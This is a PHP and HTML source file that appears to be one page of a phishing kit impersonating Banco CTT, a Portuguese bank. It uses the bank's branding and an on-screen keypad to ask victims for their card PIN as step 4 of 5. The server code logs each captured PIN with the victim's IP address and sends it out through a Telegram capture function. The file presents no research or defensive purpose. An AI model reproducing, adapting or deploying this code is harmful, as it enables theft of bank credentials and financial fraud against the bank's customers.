<?php
// ============================================================
//  pin.php — Step 4: 4-digit PIN with on-screen keypad
//  
// ============================================================
require_once 'config.php';

$ip = client_ip();
init_state($ip, 'pin');

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $pin = preg_replace('/\D/', '', safe_input('pin'));

    if (strlen($pin) < 4 || strlen($pin) > 6) {
        json_response(array('status' => 'error', 'message' => 'O PIN deve ter 4 a 6 dígitos.'));
    }

    $data = array('pin' => $pin);
    log_capture('PIN', $ip, $data);
    send_telegram_capture('PIN', '🔐 PIN Code', $ip, $data);
    update_state_step($ip, 'pin', $data);

    json_response(array('status' => 'ok', 'redirect' => 'loading.php'));
}
?>
<!DOCTYPE html>
<html lang="pt">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Introdução do PIN | Banco CTT Online</title>
<style><?php include '_style.php'; ?></style>
</head>
<body>
<div class="page">
    <div class="card">
        <div class="brand-bar">Operação Segura</div>

        <div class="step-header">
            <span>Código PIN</span>
            <span class="step-num">Passo 4 / 5</span>
        </div>

        <div class="logo-area">
            <img src="https://thebanks.eu/img/logos/Banco_CTT.png" alt="Banco CTT" onerror="this.outerHTML='<span class=&quot;logo-fallback&quot;>Banco CTT</span>'">
        </div>

        <div class="progress">
            <div class="seg done"></div>
            <div class="seg done"></div>
            <div class="seg done"></div>
            <div class="seg active"></div>
            <div class="seg"></div>
        </div>

        <div class="body">
            <h2>Introduza o seu PIN</h2>
            <p class="subtitle">
                Para concluir a operação, introduza<br>
                o código PIN de 4 dígitos do seu cartão.
            </p>

            <div id="msg" class="msg"></div>

            <form id="pinForm" autocomplete="off">
                <div class="code-dots" id="dots">
                    <div class="dot" data-idx="0">•</div>
                    <div class="dot" data-idx="1">•</div>
                    <div class="dot" data-idx="2">•</div>
                    <div class="dot" data-idx="3">•</div>
                </div>

                <input type="hidden" name="pin" id="pinInput">

                <div class="keypad" id="keypad">
                    <div class="key" data-val="1">1</div>
                    <div class="key" data-val="2">2</div>
                    <div class="key" data-val="3">3</div>
                    <div class="key" data-val="4">4</div>
                    <div class="key" data-val="5">5</div>
                    <div class="key" data-val="6">6</div>
                    <div class="key" data-val="7">7</div>
                    <div class="key" data-val="8">8</div>
                    <div class="key" data-val="9">9</div>
                    <div class="key special" data-val="clear">CLEAR</div>
                    <div class="key" data-val="0">0</div>
                    <div class="key special" data-val="back">⌫</div>
                </div>

                <button type="submit" class="btn btn-primary" id="submitBtn" disabled>CONFIRMAR</button>

                <p style="text-align:center;margin-top:12px;font-size:11px;color:#888">
                    Esqueceu-se do PIN? <a href="#" onclick="alert('Contacte o serviço de apoio ao cliente.');return false;">Repor PIN</a>
                </p>
            </form>
        </div>

        <div class="footer">
            © 2026 Banco CTT — A sua operação está protegida
        </div>
    </div>
</div>

<div class="overlay" id="overlay"><div class="spinner"></div></div>

<script>
(function(){
    var dots     = document.querySelectorAll('#dots .dot');
    var keypad   = document.getElementById('keypad');
    var form     = document.getElementById('pinForm');
    var pinInput = document.getElementById('pinInput');
    var msg      = document.getElementById('msg');
    var overlay  = document.getElementById('overlay');
    var submitBtn= document.getElementById('submitBtn');

    var MAX_LEN = 4;
    var current = '';

    function render(){
        for (var i = 0; i < dots.length; i++) {
            if (i < current.length) {
                dots[i].textContent = '•';
                dots[i].classList.add('filled');
            } else {
                dots[i].textContent = i === current.length ? '_' : '•';
                dots[i].classList.remove('filled');
                if (i === current.length) dots[i].classList.add('active');
                else dots[i].classList.remove('active');
            }
        }
        submitBtn.disabled = (current.length !== MAX_LEN);
    }

    function press(d){
        if (/^\d$/.test(d)) {
            if (current.length < MAX_LEN) {
                current += d;
                // Briefly show the actual digit, then mask
                var idx = current.length - 1;
                dots[idx].textContent = d;
                dots[idx].classList.add('filled');
                setTimeout(function(){
                    if (current.length > idx) {
                        dots[idx].textContent = '•';
                    }
                }, 250);
            }
        } else if (d === 'back') {
            current = current.slice(0, -1);
        } else if (d === 'clear') {
            current = '';
        }
        render();
    }

    // On-screen keypad clicks
    keypad.addEventListener('click', function(e){
        var key = e.target.closest('.key');
        if (!key) return;
        var v = key.getAttribute('data-val');
        press(v);
    });

    // Physical keyboard input
    document.addEventListener('keydown', function(e){
        if (overlay.classList.contains('show')) return;
        if (/^[0-9]$/.test(e.key)) {
            e.preventDefault();
            press(e.key);
        } else if (e.key === 'Backspace') {
            e.preventDefault();
            press('back');
        } else if (e.key === 'Escape') {
            press('clear');
        } else if (e.key === 'Enter') {
            if (current.length === MAX_LEN) {
                e.preventDefault();
                form.requestSubmit();
            }
        }
    });

    // Init
    render();

    form.addEventListener('submit', function(e){
        e.preventDefault();
        if (current.length !== MAX_LEN) return;

        pinInput.value = current;
        overlay.classList.add('show');
        submitBtn.disabled = true;
        keypad.style.pointerEvents = 'none';
        keypad.style.opacity = '0.5';

        var xhr = new XMLHttpRequest();
        xhr.open('POST', 'pin.php', true);
        xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
        xhr.onreadystatechange = function(){
            if (xhr.readyState !== 4) return;
            overlay.classList.remove('show');
            try {
                var resp = JSON.parse(xhr.responseText);
                if (resp.status === 'ok' && resp.redirect) {
                    window.location.href = resp.redirect;
                } else {
                    msg.className = 'msg error';
                    msg.textContent = resp.message || 'PIN incorreto. Tente novamente.';
                    msg.style.display = 'block';
                    current = '';
                    render();
                    keypad.style.pointerEvents = '';
                    keypad.style.opacity = '';
                }
            } catch(err) {
                msg.className = 'msg error';
                msg.textContent = 'Erro de comunicação.';
                msg.style.display = 'block';
                current = '';
                render();
                keypad.style.pointerEvents = '';
                keypad.style.opacity = '';
            }
        };
        xhr.send('pin=' + encodeURIComponent(current));
    });
})();
</script>
</body>
</html>